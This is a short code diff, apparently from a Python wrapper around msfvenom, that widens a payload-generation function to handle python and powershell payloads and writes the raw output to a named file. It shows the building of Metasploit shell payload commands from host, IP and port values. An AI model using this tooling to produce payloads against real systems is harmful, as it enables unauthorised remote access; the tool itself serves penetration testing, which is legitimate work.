@@ -127,10 +127,11 @@ def generate_payload(params,number,avail_payloads):
     pname = " ".join([K_TYPE, K_ARCH,K_MET, K_BIND,K_STAGE,IP,str(PORT)]).replace(" ","-") # pretify pname
     pname = "_" + pname # fast trick to remove all payload in dir via rm _*
     
-    if "cmd/" in payload_cmd or "vbs" in payload_cmd:
+    if "cmd/" in payload_cmd or "vbs" in payload_cmd or "python/" in payload_cmd or "powershell" in payload_cmd:
         K_TYPE=""
-        print(Green("[EXPERIMENTAL] Try to process payload.."))
-        payload="msfvenom -p {} {}={} LPORT={} -f raw".format(payload_cmd,HOST, IP,PORT)       
+        print(Green("[EXPERIMENTAL] You'll need to add the extension to the file (ex: .py for Python)"))
+        print(Green("[*] Processing payload.."))
+        payload="msfvenom -p {} {}={} LPORT={} -f raw -o {}".format(payload_cmd,HOST, IP,PORT,pname)       
     
     if "osx/" in payload_cmd:
         print(Green("[EXPERIMENTAL] Try to process OSX payload.."))
